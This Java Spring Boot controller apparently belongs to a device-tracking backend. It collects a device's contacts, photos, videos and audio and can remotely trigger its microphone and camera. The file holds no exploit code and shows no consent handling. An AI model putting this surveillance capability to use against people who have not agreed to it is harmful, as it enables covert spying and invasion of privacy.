package com.manish.device_tracker_api.controller;

import java.io.IOException;
import java.util.List;

import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;

import com.manish.device_tracker_api.dto.ApiResponse;
import com.manish.device_tracker_api.dto.ContactPayload;
import com.manish.device_tracker_api.dto.ContactResponse;
import com.manish.device_tracker_api.dto.ImageFolderSyncRequest;
import com.manish.device_tracker_api.dto.ImageRefreshRequest;
import com.manish.device_tracker_api.dto.ImageResponse;
import com.manish.device_tracker_api.dto.MicRequest;
import com.manish.device_tracker_api.entity.Audio;
import com.manish.device_tracker_api.entity.Video;
import com.manish.device_tracker_api.service.MediaService;

import lombok.RequiredArgsConstructor;

@RestController
@RequestMapping("/media")
@RequiredArgsConstructor
public class MediaController {

    private final MediaService mediaService;

    // ======================= Contact =======================

    @PostMapping("/contact/save")
    public ApiResponse<String> saveContact(
            @RequestBody ContactPayload request) {

        mediaService.saveContact(request);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Contact Saved")
                .data(null)
                .build();
    }

    @GetMapping("/contact/{deviceId}")
    public ApiResponse<List<ContactResponse>> getContacts(
            @PathVariable String deviceId) {

        return ApiResponse.<List<ContactResponse>>builder()
                .success(true)
                .message("Success")
                .data(mediaService.getContacts(deviceId))
                .build();
    }

    @PutMapping("/contacts/refresh/{deviceId}")
    public ApiResponse<String> refreshContacts(
            @PathVariable String deviceId) {

        mediaService.refreshContacts(deviceId);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Refresh Requested")
                .data(null)
                .build();
    }

    @DeleteMapping("/contact/{deviceId}")
    public ApiResponse<String> deleteContacts(
            @PathVariable String deviceId) {

        mediaService.deleteContacts(deviceId);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Contacts Deleted")
                .data(null)
                .build();
    }

    // ======================= Image =======================

@PostMapping("/image/upload")
public ApiResponse<String> uploadImages(

        @RequestParam("deviceId") String deviceId,

        @RequestParam("files") List<MultipartFile> files)

        throws IOException {

    mediaService.saveImages(deviceId, files);

    return ApiResponse.<String>builder()
            .success(true)
            .message("Images Uploaded")
            .build();
}

    @GetMapping("/image/{deviceId}")
    public ApiResponse<List<ImageResponse>> getImages(
            @PathVariable String deviceId) {

        return ApiResponse.<List<ImageResponse>>builder()
                .success(true)
                .message("Success")
                .data(mediaService.getImages(deviceId))
                .build();
    }

    @DeleteMapping("/image/{deviceId}")
    public ApiResponse<String> deleteImages(
            @PathVariable String deviceId) {

        mediaService.deleteImages(deviceId);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Images Deleted")
                .data(null)
                .build();
    }

    @PostMapping("/image/folders")
    public ApiResponse<String> syncFolders(
            @RequestBody ImageFolderSyncRequest request) {

        mediaService.syncFolders(request);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Folder Synced")
                .data(null)
                .build();
    }

    @GetMapping("/image/folders/{deviceId}")
    public ApiResponse<?> getFolders(
            @PathVariable String deviceId) {

        return ApiResponse.builder()
                .success(true)
                .message("Success")
                .data(mediaService.getFolders(deviceId))
                .build();
    }

    @PostMapping("/image/refresh")
    public ApiResponse<String> refreshImages(
            @RequestBody ImageRefreshRequest request) {

        mediaService.refreshImages(request);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Refresh Requested")
                .data(null)
                .build();
    }

    // ======================= Video =======================

    @PostMapping("/video/upload")
    public ApiResponse<String> uploadVideos(

            @RequestParam("deviceId") String deviceId,

            @RequestParam("files") List<MultipartFile> files)

            throws IOException {

        mediaService.saveVideos(deviceId, files);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Videos Uploaded")
                .data(null)
                .build();
    }

    @PostMapping("/video/request/{deviceId}")
    public ApiResponse<String> requestVideos(
            @PathVariable String deviceId) {

        mediaService.requestVideos(deviceId);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Video request sent successfully")
                .data(null)
                .build();
    }

    @GetMapping("/video/{deviceId}")
    public ApiResponse<List<Video>> getVideos(
            @PathVariable String deviceId) {

        return ApiResponse.<List<Video>>builder()
                .success(true)
                .message("Success")
                .data(mediaService.getVideos(deviceId))
                .build();
    }

    @DeleteMapping("/video/{deviceId}")
    public ApiResponse<String> deleteVideos(
            @PathVariable String deviceId) {

        mediaService.deleteVideos(deviceId);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Videos Deleted")
                .data(null)
                .build();
    }

    // ======================= Audio =======================

    @PostMapping("/audio/upload")
    public ApiResponse<String> uploadAudios(

            @RequestParam("deviceId") String deviceId,

            @RequestParam("files") List<MultipartFile> files)

            throws IOException {

        mediaService.saveAudios(deviceId, files);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Audios Uploaded")
                .data(null)
                .build();
    }

    @GetMapping("/audio/{deviceId}")
    public ApiResponse<List<Audio>> getAudios(
            @PathVariable String deviceId) {

        return ApiResponse.<List<Audio>>builder()
                .success(true)
                .message("Success")
                .data(mediaService.getAudios(deviceId))
                .build();
    }

    @PostMapping("/audio/request/{deviceId}")
    public ApiResponse<String> requestAudio(
            @PathVariable String deviceId) {

        mediaService.requestAudio(deviceId);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Audio request sent successfully")
                .data(null)
                .build();
    }

    @DeleteMapping("/audio/{deviceId}")
    public ApiResponse<String> deleteAudios(
            @PathVariable String deviceId) {

        mediaService.deleteAudios(deviceId);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Audios Deleted")
                .data(null)
                .build();
    }

    // ======================= Mic =======================

    @PostMapping("/mic/request")
    public ApiResponse<String> requestMic(
            @RequestBody MicRequest request) {

        mediaService.requestMic(request);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Success")
                .data(null)
                .build();
    }

    // ======================= Camera =======================

    @PostMapping("/camera/request/{deviceId}")
    public ApiResponse<String> requestCamera(
            @PathVariable String deviceId) {

        mediaService.requestCamera(deviceId);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Camera request sent")
                .data(null)
                .build();
    }

    @GetMapping("/camera/status/{deviceId}")
    public ApiResponse<Boolean> cameraStatus(
            @PathVariable String deviceId) {

        return ApiResponse.<Boolean>builder()
                .success(true)
                .message("Success")
                .data(mediaService.cameraStatus(deviceId))
                .build();
    }

    @PostMapping("/camera/started/{deviceId}")
    public ApiResponse<String> cameraStarted(
            @PathVariable String deviceId) {

        mediaService.cameraStarted(deviceId);

        return ApiResponse.<String>builder()
                .success(true)
                .message("OK")
                .data(null)
                .build();
    }

    @PostMapping("/camera/stopped/{deviceId}")
    public ApiResponse<String> cameraStopped(
            @PathVariable String deviceId) {

        mediaService.cameraStopped(deviceId);

        return ApiResponse.<String>builder()
                .success(true)
                .message("OK")
                .data(null)
                .build();
    }

    @PostMapping("/camera/request-received/{deviceId}")
    public ApiResponse<String> cameraRequestReceived(
            @PathVariable String deviceId) {

        mediaService.cameraRequestReceived(deviceId);

        return ApiResponse.<String>builder()
                .success(true)
                .message("Camera Request Received")
                .data(null)
                .build();
    }

}